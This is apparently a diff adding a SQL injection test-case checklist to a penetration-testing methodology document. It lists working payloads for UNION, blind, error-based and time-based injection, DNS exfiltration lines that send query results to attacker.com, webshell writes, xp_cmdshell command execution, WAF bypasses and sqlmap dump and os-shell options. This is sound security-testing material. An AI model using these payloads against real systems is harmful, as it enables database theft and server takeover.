@@ -318,3 +318,181 @@
 
 </details>
 
+<details>
+
+<summary>SQL Injection</summary>
+
+### SQL Injection — Test-Case Checklist
+
+> Run these boxes against an injectable surface. Order: find injection points → detect → identify type/DBMS → confirm → exploit (UNION/boolean/error/time/OOB) → second-order → WAF bypass → automate → impact. Add a unique marker per probe so you can track which input reflected.
+
+***
+
+### 0. Map the Attack Surface (where to inject)
+
+* [ ] **ID-based params** (`?id=`, `user_id`, `pid`) — most common
+* [ ] Login form — username/email field
+* [ ] Login form — password field
+* [ ] Remember-me cookie value
+* [ ] Session tokens
+* [ ] OAuth callback parameters
+* [ ] 2FA/MFA endpoints
+* [ ] Search: main input, search API, advanced filters, autocomplete/typeahead
+* [ ] Account recovery: forgot-password input, reset link, verification, username lookup
+* [ ] Admin / CMS panels
+* [ ] E-commerce: cart, checkout, payment callbacks, invoice gen, order-status lookup
+* [ ] Profile/settings: edit endpoints, view-by-ID, notification prefs
+* [ ] User content: comments, reviews/ratings, contact forms, support tickets
+* [ ] List/filter controls: `page=`, `sort=`, `order=`, category dropdowns, date ranges
+* [ ] **Non-obvious inputs:** HTTP headers (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies, JSON body fields, GraphQL args, file-upload names
+
+***
+
+### 1. Recon / Tooling Setup
+
+* [ ] Burp Active Scan + Agartha extension on candidate requests
+* [ ] Subdomains → crawl → `gf sqli urls >> sqli` → `sqlmap -m sqli --dbs --batch`
+* [ ] Dork `.php`/likely-vuln paths → `Arjun` (param discovery) → `sqlmap`
+* [ ] Identify request method, content-type, and which params echo into the response
+
+***
+
+### 2. Detection — Break the Query
+
+* [ ] Single quote `'` → error / 500 / different response?
+* [ ] Double quote `"`
+* [ ] Backtick `` ` ``
+* [ ] Two singles `''` (re-balance) → page returns to normal?
+* [ ] Backslash `\`
+* [ ] Math test: `?id=2-1` returns same as `?id=1` (numeric context)
+* [ ] Boolean pair: `' AND '1'='1` (true) vs `' AND '1'='2` (false)
+* [ ] Numeric boolean: `AND 1=1` vs `AND 1=2`
+* [ ] Concatenation tests: `'||'`, `'+'`, `' '` (Oracle/MSSQL/MySQL differ)
+* [ ] Comment terminators: `-- -`, `#`, `/*`, `;%00`
+
+***
+
+### 3. Identify Context & DBMS
+
+* [ ] Determine context: numeric / single-quote string / double-quote / LIKE `%...%` / IN () / ORDER BY
+* [ ] Fingerprint via error messages
+* [ ] Version strings: `@@version` (MySQL/MSSQL), `version()` (PG/MySQL), `banner` (Oracle)
+* [ ] Concatenation behavior: `CONCAT()` (MySQL) / `||` (PG/Oracle) / `+` (MSSQL)
+* [ ] Comment style: `-- -` / `#` (MySQL) / `--` (PG/MSSQL/Oracle)
+* [ ] String funcs: `SUBSTRING`/`SUBSTR`/`MID`, `SLEEP`/`pg_sleep`/`WAITFOR`/`dbms_pipe`
+
+***
+
+### 4. UNION-Based
+
+* [ ] Find column count via `ORDER BY 1..N` until error
+* [ ] Find column count via `UNION SELECT NULL,NULL,...`
+* [ ] Identify which columns are reflected (string-compatible): `UNION SELECT 'a',NULL,..`
+* [ ] Dump version into a visible column
+* [ ] Enumerate DBs: `information_schema.schemata`
+* [ ] Enumerate tables: `information_schema.tables`
+* [ ] Enumerate columns: `information_schema.columns`
+* [ ] Dump creds/PII from target tables
+* [ ] Oracle: append `FROM dual`; MSSQL: column type-match matters
+
+***
+
+### 5. Boolean-Based Blind
+
+* [ ] Confirm true/false divergence with `AND 1=1` / `AND 1=2`
+* [ ] Extract length: `AND LENGTH(database())=N`
+* [ ] Char-by-char: `AND SUBSTRING(database(),1,1)='a'`
+* [ ] Binary search with `ASCII()`/`>`/`<` to speed extraction
+* [ ] Use `LIKE` divergence (e.g. comment-hiding trick on Pornhub-style filters)
+
+***
+
+### 6. Error-Based
+
+* [ ] MySQL `extractvalue(1,concat(0x7e,(SELECT @@version)))`
+* [ ] MySQL `updatexml(1,concat(0x7e,(SELECT database())),1)`
+* [ ] MySQL double-query / `floor(rand()*2)` group-by error
+* [ ] MSSQL `CONVERT(int,(SELECT @@version))` / `CAST`
+* [ ] PostgreSQL `CAST((SELECT version()) AS int)`
+* [ ] Oracle `CTXSYS.DRITHSX.SN` / `utl_inaddr.get_host_name`
+
+***
+
+### 7. Time-Based Blind (payload bank)
+
+* [ ] MySQL `SLEEP(5)#` and `' or sleep(5)#` (and `"`, `)`, `))`, `')`, `")` variants)
+* [ ] MySQL stacked subselect: `AND (SELECT * FROM (SELECT(SLEEP(5)))a)`
+* [ ] MySQL `'XOR(if(now()=sysdate(),sleep(5),0))OR'`
+* [ ] MySQL `benchmark(10000000,MD5(1))#`
+* [ ] PostgreSQL `pg_sleep(5)--` (and quote/paren variants)
+* [ ] MSSQL `;waitfor delay '0:0:5'--` (and `'`, `"`, `)` variants)
+* [ ] SQLite heavy query: `AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))`
+* [ ] `ORDER BY SLEEP(5)` / `'&&SLEEP(5)&&'1` context variants
+* [ ] Confirm timing is consistent (run baseline + repeat to rule out jitter)
+
+***
+
+### 8. Stacked Queries & OOB (out-of-band)
+
+* [ ] Stacked query support: `; SELECT ...` / `;WAITFOR DELAY` (MSSQL, PG)
+* [ ] DNS exfil — MySQL `LOAD_FILE(CONCAT('\\\\',(query),'.attacker.com\\x'))`
+* [ ] DNS exfil — MSSQL `master..xp_dirtree '\\(query).attacker.com\x'`
+* [ ] DNS exfil — Oracle `UTL_HTTP` / `UTL_INADDR` / `DBMS_LDAP`
+* [ ] PostgreSQL OOB via `dblink` / `COPY ... TO PROGRAM` (if superuser)
+* [ ] Burp Collaborator / interactsh as the listener
+
+***
+
+### 9. Second-Order
+
+* [ ] Identify input stored now, used in a query later (registration username, profile field)
+* [ ] Plant payload on store endpoint, trigger on the consuming endpoint
+* [ ] sqlmap `--second-order=<url>` (or `--second-req`) to automate the trigger
+* [ ] Watch for payloads firing in admin/reporting/export views
+
+***
+
+### 11. Advanced / RCE Escalation
+
+* [ ] MySQL file read: `LOAD_FILE('/etc/passwd')` (needs FILE priv + secure\_file\_priv)
+* [ ] MySQL file write: `INTO OUTFILE`/`DUMPFILE` → webshell in webroot
+* [ ] MSSQL `xp_cmdshell` (enable via `sp_configure`) → OS command
+* [ ] MSSQL linked servers / `OPENQUERY`
+* [ ] Oracle `DBMS_SCHEDULER`/`DBMS_JAVA` for command exec
+* [ ] Read DB creds → pivot / reuse elsewhere
+* [ ] Signature/HMAC bypass on signed params (Razer easy2pay-style) before injecting
+
+***
+
+### 12. WAF / Filter Bypass
+
+* [ ] Inline comments: `/*!50000SELECT*/`, `SE/**/LECT`
+* [ ] Case toggling: `SeLeCt`, `UnIoN`
+* [ ] Whitespace alts: `%09`, `%0a`, `%0c`, `%a0`, `/**/`, `+`
+* [ ] Encoding: URL, double-URL, unicode, hex (`0x...`), char() concat
+* [ ] Keyword splitting / nesting: `UNIONUNION SELECTSELECT`
+* [ ] Alternate operators: `||`, `&&`, `LIKE`, `RLIKE`, `REGEXP` instead of `=`
+* [ ] Logical equivalents: `AND 1` , `AND true()`, `AND 2>1`
+* [ ] sqlmap `--tamper` (space2comment, between, charencode, randomcase, etc.)
+* [ ] Cookie / header injection point to dodge URL-focused WAF rules
+
+***
+
+### 13. Automation (sqlmap)
+
+* [ ] `sqlmap -r request.txt --batch` (use a saved proxy request)
+* [ ] `--level=5 --risk=3` for deeper tests
+* [ ] `--dbms=` to pin the DBMS once known
+* [ ] `--technique=BEUSTQ` to control which methods run
+* [ ] `--dbs` → `--tables` → `--columns` → `--dump`
+* [ ] `--tamper=` chain for WAF bypass
+* [ ] `--second-order=<url>` for stored injection
+* [ ] `--os-shell` / `--sql-shell` for exploitation
+* [ ] Headers/cookie: mark injection point with `*` and `--cookie`/`-H`
+
+
+
+</details>
+
+
+
